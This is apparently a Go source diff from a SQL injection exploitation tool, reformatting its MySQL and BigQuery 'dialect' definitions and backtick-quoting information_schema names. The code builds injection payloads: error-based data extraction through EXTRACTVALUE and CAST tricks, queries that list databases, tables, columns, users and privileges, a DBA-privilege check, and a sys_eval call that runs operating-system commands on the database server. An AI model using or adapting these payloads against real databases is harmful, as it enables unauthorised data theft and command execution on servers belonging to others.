@@ -72,15 +72,15 @@ type Dialect struct {
 	Roles      func() string
 
 	// Table access.
-	RowCount     func(ref TableRef, where string) string
-	DumpRow      func(ref TableRef, cols []string, offset int, where string) string
-	FileRead     func(string) (string, bool)
-	OSCmd        func(string) (string, bool)
-	SearchTables func(string) string
+	RowCount      func(ref TableRef, where string) string
+	DumpRow       func(ref TableRef, cols []string, offset int, where string) string
+	FileRead      func(string) (string, bool)
+	OSCmd         func(string) (string, bool)
+	SearchTables  func(string) string
 	SearchColumns func(string) string
-	TableColumns func(db, schema, table string) string
-	AllTables    func() string
-	AllColumns   func() string
+	TableColumns  func(db, schema, table string) string
+	AllTables     func() string
+	AllColumns    func() string
 }
 
 func quoteBacktick(s string) string {
@@ -376,7 +376,7 @@ func mysqlDialect() *Dialect {
 			return fmt.Sprintf("EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))", expr), true
 		},
 		Databases: func() string {
-			return "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x1e) FROM information_schema.schemata)"
+			return "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x1e) FROM `information_schema`.`schemata`)"
 		},
 		Schemas: func(db string) string { return "" },
 		Tables: func(db, schema string) string {
@@ -384,28 +384,28 @@ func mysqlDialect() *Dialect {
 				db = schema
 			}
 			if db == "" {
-				return "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema=DATABASE())"
+				return "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema=DATABASE())"
 			}
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema=%s)", literal(db))
+			return fmt.Sprintf("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema=%s)", literal(db))
 		},
 		Columns: func(db, schema, table string) string {
 			if schema != "" {
 				db = schema
 			}
 			if db == "" {
-				return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
+				return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
 			}
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
+			return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
 		},
 		CurrentDB: func() string { return "DATABASE()" },
 		Version:   func() string { return "@@VERSION" },
 		User:      func() string { return "USER()" },
 		Hostname:  func() string { return "@@hostname" },
 		IsDBA: func() string {
-			return "(SELECT COUNT(*) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT('''',SUBSTRING_INDEX(USER(),'@',1),'''@''%''') AND PRIVILEGE_TYPE='SUPER')"
+			return "(SELECT COUNT(*) FROM `information_schema`.`user_privileges` WHERE GRANTEE=CONCAT('''',SUBSTRING_INDEX(USER(),'@',1),'''@''%''') AND PRIVILEGE_TYPE='SUPER')"
 		},
 		Privileges: func() string {
-			return "(SELECT GROUP_CONCAT(CONCAT(GRANTEE,':',PRIVILEGE_TYPE) SEPARATOR 0x1e) FROM information_schema.user_privileges)"
+			return "(SELECT GROUP_CONCAT(CONCAT(GRANTEE,':',PRIVILEGE_TYPE) SEPARATOR 0x1e) FROM `information_schema`.`user_privileges`)"
 		},
 		Users: func() string {
 			return "(SELECT GROUP_CONCAT(CONCAT(user,'@',host) SEPARATOR 0x1e) FROM mysql.user)"
@@ -433,25 +433,25 @@ func mysqlDialect() *Dialect {
 			return fmt.Sprintf("(SELECT sys_eval(%s))", mysqlLiteral(cmd)), true
 		},
 		SearchTables: func(keyword string) string {
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
+			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
 		},
 		TableColumns: func(db, schema, table string) string {
 			if schema != "" {
 				db = schema
 			}
 			if db == "" {
-				return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
+				return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
 			}
-			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
+			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
 		},
 		AllTables: func() string {
-			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
+			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
 		},
 		AllColumns: func() string {
-			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
+			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
 		},
 	}
 }
@@ -1254,16 +1254,16 @@ func snowflakeDialect() *Dialect {
 
 func bigqueryDialect() *Dialect {
 	return &Dialect{
-		Name:    "BigQuery",
-		Aliases: defaultAliases("BigQuery", "BQ", "Google BigQuery"),
-		Quote:   quoteBacktick,
-		Str:     literal,
-		Concat:  concatFunc("CONCAT"),
-		Length:  func(e string) string { return "LENGTH(" + e + ")" },
-		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
-		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
-		Marker:  markerFunc,
-		SleepExpr: func(n int) string { return "0" },
+		Name:          "BigQuery",
+		Aliases:       defaultAliases("BigQuery", "BQ", "Google BigQuery"),
+		Quote:         quoteBacktick,
+		Str:           literal,
+		Concat:        concatFunc("CONCAT"),
+		Length:        func(e string) string { return "LENGTH(" + e + ")" },
+		Substr:        func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
+		ASCII:         func(e string) string { return "ASCII(" + e + ")" },
+		Marker:        markerFunc,
+		SleepExpr:     func(n int) string { return "0" },
 		TimeCondition: func(cond string, n int) string { return "1" },
 		ErrorExpr: func(expr string) (string, bool) {
 			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT64)", expr), true
